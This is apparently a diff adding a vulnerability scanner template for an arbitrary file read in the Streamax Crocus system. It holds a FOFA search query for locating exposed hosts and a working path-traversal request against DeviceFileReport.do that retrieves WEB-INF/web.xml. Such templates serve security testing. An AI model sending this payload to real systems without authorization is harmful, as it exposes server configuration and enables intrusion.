@@ -1,0 +1,30 @@
+id: streamax-DeviceFileReport-fileread
+info:
+  name: 锐明技术Crocus系统 DeviceFileReport.do 任意文件读取
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://vip.bdziyi.com/59682/
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="inp_verification" || body="/ThirdResource/respond/respond.min.js" && title="Crocus"
+    tips:
+    repair:
+    version:
+  tags: streamax,fileread
+
+http:
+  - raw:
+      - |
+        GET /DeviceFileReport.do?Action=Download&FilePath=/../WEB-INF/web.xml HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'xml version','servlet')
+        condition: and
